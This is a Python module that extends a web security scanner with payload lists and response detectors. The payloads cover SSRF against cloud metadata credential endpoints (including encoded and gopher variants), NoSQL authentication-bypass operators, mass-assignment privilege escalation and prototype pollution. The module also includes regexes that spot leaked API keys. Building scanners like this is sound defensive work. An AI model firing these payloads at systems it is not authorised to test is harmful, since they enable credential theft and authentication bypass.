"""Industry-grade DAST pattern extensions.

This module keeps high-signal payload and detector additions in one place so
active fuzzing, passive token detection, and parameter prioritization can share
the same pattern pack without turning core scanner modules into longer lists.
"""
from __future__ import annotations

import re


ACTIVE_PAYLOAD_EXTENSIONS: dict[str, list[str]] = {
    "ssrf": [
        # Modern cloud metadata endpoints and encoding/protocol variants.
        "http://169.254.170.2/v2/credentials",
        "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
        "http://[fd00:ec2::254]/latest/meta-data/",
        "http://[::ffff:169.254.169.254]/latest/meta-data/",
        "http://0xA9FEA9FE/latest/meta-data/",
        "http://2852039166/latest/meta-data/",
        "http://metadata/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/?recursive=true",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net",
        "http://169.254.169.254/opc/v2/instance/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/%252e%252e/",
        "gopher://169.254.169.254:80/_GET%20/latest/meta-data/%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0a%0d%0a",
        "dict://169.254.169.254:11211/stat",
    ],
    "nosql_injection": [
        '{"username":{"$ne":null},"password":{"$ne":null}}',
        '{"user":{"$regex":".*"},"pass":{"$regex":".*"}}',
        '{"$expr":{"$gt":["$balance",0]}}',
        '{"$expr":{"$eq":[{"$toLower":"$role"},"admin"]}}',
        '{"$jsonSchema":{"required":["password"]}}',
        '{"$function":{"body":"function(){return true}","args":[],"lang":"js"}}',
        '{"$accumulator":{"init":"function(){return 1}","accumulate":"function(){return 1}","accumulateArgs":[],"merge":"function(){return 1}","lang":"js"}}',
        '{"$comment":"DAST_NOSQL_PROBE"}',
        "username[$ne]=&password[$ne]=",
        "user[$regex]=.*&pass[$regex]=.*",
        "filter[$where]=this.password.length>0",
        "selector[$gt]=",
    ],
    "mass_assignment": [
        '{"tenant_id": "attacker-tenant"}',
        '{"organization_id": "attacker-org"}',
        '{"org_id": "attacker-org"}',
        '{"owner_id": 1}',
        '{"account_id": 1}',
        '{"mfa_enabled": false}',
        '{"two_factor_enabled": false}',
        '{"email_verified_at": "2099-01-01T00:00:00Z"}',
        '{"plan": "enterprise"}',
        '{"subscription_status": "active"}',
        '{"quota": 999999}',
        '{"scopes": ["admin", "write", "billing"]}',
        '{"permissions": ["*"]}',
        '{"is_staff": true}',
    ],
    "prototype_pollution_body": [
        '{"constructor.prototype.polluted": "DAST_PP_CONFIRMED"}',
        '{"constructor.prototype.isAdmin": true}',
        '{"__proto__[polluted]": "DAST_PP_CONFIRMED"}',
        '{"prototype": {"polluted": "DAST_PP_CONFIRMED"}}',
    ],
}


DETECTOR_EXTENSIONS: dict[str, list[tuple[str, str]]] = {
    "ssrf": [
        (r'"AccessKeyId"\s*:\s*"ASIA[A-Z0-9]{16}"',
         "SSRF CRITICAL - AWS STS temporary credentials exposed"),
        (r'"azEnvironment"\s*:\s*"Azure',
         "SSRF confirmed - Azure instance metadata response exposed"),
        (r'"vmId"\s*:\s*"[0-9a-f-]{20,}"',
         "SSRF confirmed - Azure VM metadata identifier exposed"),
        (r"169\.254\.170\.2|AWS_CONTAINER_CREDENTIALS_RELATIVE_URI",
         "SSRF confirmed - ECS task credential endpoint reached"),
        (r"kubernetes\.io/serviceaccount|\"kind\"\s*:\s*\"PodList\"",
         "SSRF CRITICAL - Kubernetes service-account or pod metadata exposed"),
        (r"opc/v2/instance|\"availabilityDomain\"",
         "SSRF confirmed - Oracle Cloud instance metadata exposed"),
    ],
    "nosql_injection": [
        (r"MongoServerError", "NoSQL injection - modern MongoDB server error"),
        (r"unknown top level operator", "NoSQL injection - MongoDB operator parsing error"),
        (r"PlanExecutor error during aggregation", "NoSQL injection - aggregation pipeline error"),
        (r"BSONError|BSONTypeError", "NoSQL injection - BSON parser error"),
        (r"Cannot use \$where", "NoSQL injection - JavaScript query operator rejected"),
    ],
    "mass_assignment": [
        (r'"tenant_id"\s*:\s*"attacker-tenant"',
         "Mass Assignment - tenant boundary field accepted"),
        (r'"organization_id"\s*:\s*"attacker-org"',
         "Mass Assignment - organization boundary field accepted"),
        (r'"mfa_enabled"\s*:\s*false',
         "Mass Assignment - MFA control disabled via extra field"),
        (r'"plan"\s*:\s*"enterprise"',
         "Mass Assignment - subscription plan escalated"),
        (r'"permissions"\s*:\s*\[\s*"\*"\s*\]',
         "Mass Assignment - wildcard permissions accepted"),
    ],
}


PARAM_NAME_RULE_EXTENSIONS: list[tuple[re.Pattern, list[str]]] = [
    (
        re.compile(
            r"(?i)(?:^|_|-)(?:"
            r"id|user.?id|account.?id|customer.?id|tenant.?id|org(?:anization)?.?id|"
            r"owner.?id|member.?id|project.?id|workspace.?id|order.?id|invoice.?id|"
            r"resource.?id|object.?id|uuid|guid"
            r")(?:$|_|-)"
        ),
        ["idor", "acl_bypass", "sqli_error", "nosql_injection"],
    ),
    (
        re.compile(
            r"(?i)(?:^|_|-)(?:"
            r"is.?admin|admin|role|roles|permission|permissions|scope|scopes|"
            r"is.?staff|is.?superuser|verified|email.?verified|mfa.?enabled|"
            r"two.?factor.?enabled|tenant|tenant.?id|org.?id|plan|quota|"
            r"price|amount|balance|credit|discount"
            r")(?:$|_|-)"
        ),
        ["mass_assignment", "prototype_pollution_body", "acl_bypass"],
    ),
]


TOKEN_PATTERNS: list[tuple[re.Pattern, str, str, str]] = [
    (
        re.compile(r"\bsk-ant-api03-[A-Za-z0-9_-]{80,}\b"),
        "Anthropic API key (sk-ant-api03-) exposed in response",
        "Critical",
        "CWE-522",
    ),
    (
        re.compile(r"\bsk-proj-[A-Za-z0-9_-]{48,}\b"),
        "OpenAI project API key (sk-proj-) exposed in response",
        "Critical",
        "CWE-522",
    ),
    (
        re.compile(r"\bsk-svcacct-[A-Za-z0-9_-]{48,}\b"),
        "OpenAI service account API key (sk-svcacct-) exposed in response",
        "Critical",
        "CWE-522",
    ),
    (
        re.compile(r"\bcircle-token_[A-Za-z0-9_-]{40,}\b"),
        "CircleCI API token exposed in response",
        "High",
        "CWE-522",
    ),
    (
        re.compile(r"\bvercel_[A-Za-z0-9]{24,}\b"),
        "Vercel API token exposed in response",
        "High",
        "CWE-522",
    ),
    (
        re.compile(r"\blin_api_[A-Za-z0-9]{40,}\b"),
        "Linear API key exposed in response",
        "High",
        "CWE-522",
    ),
    (
        re.compile(r"\bsntrys_[A-Za-z0-9_-]{64,}\b"),
        "Sentry user auth token exposed in response",
        "High",
        "CWE-522",
    ),
]
